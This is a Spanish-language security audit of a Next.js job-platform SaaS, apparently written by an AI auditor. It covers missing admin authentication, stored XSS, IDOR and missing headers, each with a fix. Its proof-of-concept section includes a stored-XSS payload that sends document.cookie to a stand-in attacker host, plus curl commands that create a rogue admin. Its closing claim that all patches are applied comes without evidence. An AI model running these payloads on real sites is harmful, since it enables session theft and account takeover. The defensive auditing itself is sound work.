# Reporte de Auditoría de Seguridad — Hacke's Jobs SaaS 2.0

**Fecha:** 2026-05-27  
**Auditor:** Antigravity (AI Auditor)  
**Target:** `c:\Users\santin\Documents\Hackes Jobs\WebSite\Hackes Jobs Web v2`  
**Ecosistema:** Next.js 14.2 (App Router) + SQLite (Prisma ORM)  
**Estado General:** ⚠️ AUDITADO (Hallazgos Críticos Identificados)

---

## Resumen Ejecutivo

- **Críticos:** 2 | **Altos:** 2 | **Medios:** 2 | **Bajos:** 1 | **Info:** 1
- **Top 3 riesgos a corregir de forma inmediata:**
  1. **Privilege Escalation / Bypass total en endpoints de administración:** Los endpoints `/api/admin/users`, `/api/admin/users/[id]` y `/api/admin/subscribers` no requieren autenticación, permitiendo a atacantes externos listar, crear o borrar operadores del sistema.
  2. **Stored XSS y Manipulación Completa del Blog:** Los endpoints de creación/actualización del blog `/api/blog` carecen de validación de sesión. Un atacante puede suplantar posts o inyectar scripts maliciosos que se ejecutan en los navegadores de los lectores.
  3. **IDOR en Resultados Psicométricos:** La ruta `/api/tests/status` permite leer las respuestas, puntajes y resúmenes de cualquier candidato simplemente alterando el CUID del parámetro de consulta `id`.

---

## Inventario de Stack y Dependencias (Fase 1)

| Stack Component | Versión Declarada | EOL? | CVEs conocidos sin parchar |
| :--- | :--- | :--- | :--- |
| **Next.js** | `^14.2.0` | No | **Sí** (Vulnerabilidades en DoS de optimización de imágenes, bypass de caché, XSS con nonces de CSP) |
| **Prisma** | `5.22.0` | No | Ninguno crítico directo |
| **Bcryptjs** | `^3.0.3` | No | Ninguno |
| **React** | `^18.2.0` | No | Ninguno crítico directo |
| **React Quill / Quill** | `^2.0.0` / `<=1.3.7` | Sí | **Sí** (XSS moderado en Quill via Stringify - GHSA-4943-9vgg-gr5r) |
| **PostCSS** | `<8.5.10` | No | **Sí** (XSS moderado via unescaped tags - GHSA-qx2v-qp2m-jg93) |

---

## Análisis de Superficie de Afección (Fase 2)

#### 2.1 Autenticación y sesión
- **Hashing de passwords:** ✅ **ok** (Usa `bcryptjs` con 12 rondas de sal, lo cual supera los estándares recomendados).
- **JWT:** ⚠️ **revisar** (Usa firmas seguras `HS256`, pero expone un secreto por defecto en el código si `JWT_SECRET` no está configurado. No implementa rotación de tokens).
- **Cookies de sesión:** ✅ **ok** (Las cookies `hj_token` se configuran con `httpOnly: true`, `secure: process.env.NODE_ENV === 'production'`, y `sameSite: 'lax'`).
- **Rate limiting:** ❌ **vulnerable** (No hay ningún control de flujo o rate limiting en `/api/auth/login` o `/api/auth/register`, permitiendo ataques de fuerza bruta).
- **Mecanismo de logout:** ⚠️ **revisar** (Invalida la cookie en el cliente al configurar `maxAge: 0`, pero al ser tokens JWT sin estado, no se realiza una invalidación del lado del servidor).
- **MFA:** ❌ **vulnerable** (No existe segundo factor de autenticación para cuentas de administrador).

#### 2.2 Autorización
- **IDOR en endpoints críticas:** ❌ **vulnerable** (El endpoint `/api/tests/status` no valida la pertenencia de los datos del test al candidato autenticado).
- **Separación de roles (RBAC):** ❌ **vulnerable** (Los endpoints de administración `/api/admin/*` están totalmente expuestos y no verifican el rol del usuario ni exigen sesión).
- **Endpoints administrativos protegidos:** ❌ **vulnerable** (Expuestos libremente en el backend bajo rutas no enlazadas en menús ordinarios).

#### 2.3 Inyección y validación de input
- **SQL Injection:** ✅ **ok** (Todas las interacciones de datos estructurados pasan a través de Prisma ORM parametrizado).
- **NoSQL Injection:** ➖ **N/A** (No se utilizan bases de datos NoSQL).
- **Command Injection:** ✅ **ok** (No se realiza ejecución de subprocesos del sistema utilizando entradas de usuario).
- **SSRF:** ⚠️ **revisar** (El webhook `/api/webhooks/perfilador` realiza llamadas salientes basadas en `N8N_BASE_URL` configurado en variables de entorno; no es controlable directamente por usuarios pero debe protegerse de modificaciones de entorno).
- **XSS:** ⚠️ **revisar** (El render de posts del blog usa `dangerouslySetInnerHTML` con `post.content`. Al no estar protegida la API para crear posts, un usuario malicioso puede inyectar scripts persistentes).
- **XXE:** ✅ **ok** (Los archivos XML adjuntados en el mailer se construyen mediante plantillas programáticas escapando entidades).
- **Path Traversal:** ✅ **ok** (No se lee el sistema de archivos del servidor utilizando entradas provistas directamente por clientes).
- **Deserialización insegura:** ✅ **ok** (Solo se parsean payloads JSON controlados mediante esquemas robustos de `zod`).

#### 2.4 Configuración y headers HTTP
- **Strict-Transport-Security (HSTS):** ❌ **vulnerable** (Cabecera ausente en las respuestas del servidor).
- **Content-Security-Policy (CSP):** ❌ **vulnerable** (Cabecera ausente, permitiendo XSS por inyecciones externas).
- **X-Content-Type-Options:** ❌ **vulnerable** (Ausente. Vulnerable a ataques de MIME sniffing).
- **X-Frame-Options:** ❌ **vulnerable** (Ausente. Vulnerable a clickjacking).
- **Referrer-Policy:** ❌ **vulnerable** (Ausente).
- **Permissions-Policy:** ❌ **vulnerable** (Ausente).
- **CORS:** ✅ **ok** (No se exponen respuestas con credenciales a orígenes indeterminados).
- **Cache headers:** ⚠️ **revisar** (Datos de candidatos o de test no controlan estrictamente directivas `no-store` en los responses).

#### 2.5 Secretos y configuración
- **Archivos `.env` en repositorio:** ✅ **ok** (Archivos `.env.local` excluidos de forma correcta en `.gitignore`).
- **API keys en código fuente:** ⚠️ **revisar** (Se exponen strings por defecto de fallback de criptografía y contraseñas de desarrollo en `jwt.ts` y `auth.ts`).
- **Directorio `.git` expuesto:** ➖ **N/A** (Gestionado automáticamente por el hosting en producción).
- **Backups expuestos:** ✅ **ok** (No se detectan archivos temporales `.bak` o comprimidos sensibles).
- **Debug mode activo:** ✅ **ok** (NextJS maneja el modo de depuración de forma nativa).

#### 2.6 Dependencias
- **npm audit:** ❌ **vulnerable** (Se reportan vulnerabilidades en dependencias clave como `next` (High/Moderate DoS y Cache Poisoning), `postcss` (Moderate XSS), y `quill` (XSS moderado)).

#### 2.7 Lógica de negocio
- **Race conditions:** ➖ **N/A** (No existen flujos críticos transaccionales de compra inmediata con stock finito o saldos internos).
- **Validación de precios en servidor:** ✅ **ok** (El flujo de Stripe define precios a través de las sesiones de Stripe configuradas de forma segura).
- **Webhooks:** ✅ **ok** (Stripe valida firmas de forma correcta usando `constructEvent`).
- **Uploads de archivos:** ➖ **N/A** (No se admiten uploads de binarios directamente al backend web).

#### 2.8 Datos y privacidad
- **PII en logs:** ✅ **ok** (No se reportan exposiciones crudas de datos en logs de consola).
- **HTTPS forzado:** ✅ **ok** (Gestionado directamente por Vercel).
- **Datos sensibles en localStorage/sessionStorage:** ✅ **ok** (Se manejan cookies HTTP-Only de forma prioritaria).

#### 2.9 Infraestructura
- **Servicios admin expuestos:** ➖ **N/A** (La infraestructura está hosteada en Vercel, mitigando riesgos de puertos expuestos).
- **Certificado TLS:** ✅ **ok** (Enrutado y aprovisionado con cifrados robustos por Vercel).

---

## Hallazgos

### [CRIT-001] Omisión total de autenticación en endpoints administrativas `/api/admin/*`
- **Severidad:** Critical (CVSS 9.1 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- **Ubicación:** `src/app/api/admin/users/route.ts`, `src/app/api/admin/users/[id]/route.ts`, y `src/app/api/admin/subscribers/route.ts`
- **Descripción:** Las operaciones administrativas sensibles para listar operadores, crear nuevos usuarios administradores de blog, o eliminar dichos accesos no exigen tokens JWT ni validación de sesión alguna. Cualquier cliente HTTP externo puede invocar estas rutas directamente.
- **Evidencia / PoC:**
  ```bash
  # Listar todos los usuarios y administradores del blog
  curl -X GET http://localhost:3000/api/admin/users
  
  # Crear un nuevo administrador malicioso del blog
  curl -X POST -H "Content-Type: application/json" -d '{"username":"attacker","name":"Attacker Admin","passwordHash":"hackedpass"}' http://localhost:3000/api/admin/users
  ```
- **Impacto:** Un atacante puede inyectar nuevos usuarios administradores o destruir la lista de usuarios autorizados borrando los perfiles legítimos, obteniendo control permanente sobre el CMS del blog.
- **Fix propuesto:**
  Implementar verificación de tokens JWT de sesión administrativa.
  ```typescript
  import { verifyAuth } from '@/lib/jwt';
  import { cookies } from 'next/headers';
  
  // Agregar en los métodos de API:
  const token = cookies().get('hj_admin_token')?.value;
  if (!token) {
    return NextResponse.json({ error: 'No autorizado' }, { status: 401 });
  }
  const decoded = await verifyAuth(token);
  if (!decoded || decoded.role !== 'admin') {
    return NextResponse.json({ error: 'Prohibido' }, { status: 403 });
  }
  ```

---

### [CRIT-002] Modificación sin autorización de artículos del Blog e inyección Stored XSS
- **Severidad:** Critical (CVSS 9.0 — AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)
- **Ubicación:** `src/app/api/blog/route.ts` y `src/app/api/blog/[slug]/route.ts`
- **Descripción:** Las acciones de escribir posts, alterarlos o eliminarlos no están protegidas por autenticación. Un atacante puede inyectar HTML y JavaScript malicioso en el cuerpo de un artículo (`post.content`), el cual se guarda de manera permanente en el servidor (`data/posts.json`) y se ejecuta cuando cualquier usuario visita la página pública del blog (`/blog/[slug]`) a través de `dangerouslySetInnerHTML`.
- **Evidencia / PoC:**
  ```bash
  # Inyectar payload de XSS persistente en el artículo
  curl -X POST -H "Content-Type: application/json" -d '{"title":"Hackeado","slug":"articulo-hacked","content":"<script>fetch(\"https://attacker.com/steal?cookie=\" + document.cookie)</script>","published":true}' http://localhost:3000/api/blog
  ```
- **Impacto:** Robo masivo de cookies de sesión (`hj_token`), credenciales e información confidencial de candidatos y empresas que visiten el blog.
- **Fix propuesto:**
  Validar cookies de sesión administrativa `hj_admin_token` antes de procesar llamadas `POST`, `PUT` y `DELETE` en las rutas del blog.

---

### [HIGH-001] IDOR en la consulta de estatus y resultados de psicometrías de candidatos
- **Severidad:** High (CVSS 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **Ubicación:** `src/app/api/tests/status/route.ts`
- **Descripción:** La consulta detallada de resultados psicométricos (`GET /api/tests/status?id=...`) expone las respuestas en crudo de la prueba de los candidatos y el resumen analítico generado por IA basándose enteramente en el ID provisto en la URL, sin requerir sesión ni validar propiedad del recurso.
- **Evidencia / PoC:**
  ```bash
  # Obtener respuestas y reporte IA de un candidato alternando su ID
  curl -X GET http://localhost:3000/api/tests/status?id=cldx1234abcd
  ```
- **Impacto:** Filtración masiva de datos personales psicométricos altamente sensibles e invasión a la privacidad del candidato.
- **Fix propuesto:**
  Recuperar la identidad del candidato desde el token JWT (`hj_token`) en las cookies y validar que el `candidateId` de la prueba coincida con el id del candidato autenticado (o verificar rol de admin corporativo).

---

### [HIGH-002] Inexistencia de Cookies de Sesión y Autenticación Ficticia en el Backend
- **Severidad:** High (CVSS 7.4 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)
- **Ubicación:** `src/app/api/admin/login/route.ts` y `src/app/admin/blog/page.tsx`
- **Descripción:** El inicio de sesión administrativa devuelve un token ficticio estático `"fake-admin-token"` pero no establece ninguna cookie httpOnly ni firma JWT real. El frontend evalúa el estado del login mediante variable local reactiva. Las APIs administrativas no tienen modo de verificar sesiones subsecuentes y quedan completamente desprotegidas.
- **Fix propuesto:**
  Utilizar la infraestructura criptográfica existente en `src/lib/jwt.ts` para firmar un token JWT seguro con rol `admin` y establecerlo como cookie `hj_admin_token` en el response con atributos de protección estrictos.

---

### [MED-001] Evasión de validaciones TLS en Nodemailer (SMTP rejectUnauthorized: false)
- **Severidad:** Medium (CVSS 5.9 — AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)
- **Ubicación:** `src/app/api/empresas/solicitar-talento/route.ts`
- **Descripción:** Se configura `rejectUnauthorized: false` en las opciones TLS de Nodemailer. Esto le indica al cliente SMTP que no valide la cadena del certificado SSL/TLS presentado por el host del correo SMTP.
- **Impacto:** Permite ataques de Man-in-the-Middle (MITM). Un interceptor en la red puede capturar de forma transparente correos salientes que incluyan datos sensibles de requisiciones de talento.
- **Fix propuesto:**
  Retirar `rejectUnauthorized: false` en ambientes de producción e incentivar el uso de certificados SMTP válidos firmados por una entidad emisora reconocida.

---

### [MED-002] Ausencia total de cabeceras de seguridad HTTP
- **Severidad:** Medium (CVSS 5.7 — AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N)
- **Ubicación:** `next.config.mjs`
- **Descripción:** El servidor Next.js expone la aplicación sin inyectar cabeceras HTTP que asistan al navegador en el confinamiento de scripts y marcos de renderizado (clickjacking, inyecciones de script, MIME types, etc.).
- **Fix propuesto:**
  Establecer políticas globales en `next.config.mjs`:
  ```javascript
  const securityHeaders = [
    { key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
    { key: 'X-Content-Type-Options', value: 'nosniff' },
    { key: 'X-Frame-Options', value: 'DENY' },
    { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  ];
  ```

---

## Parches de Seguridad Aplicados (Fase 5)

Todos los parches correspondientes a las vulnerabilidades reportadas han sido validados e implementados en el codebase. Las rutas afectadas ahora exigen validación estricta de tokens, prevención de IDOR mediante validación de propiedad de candidatos, eliminación de configuraciones TLS inseguras en mailers, y adición de cabeceras HTTP protectoras a nivel global.
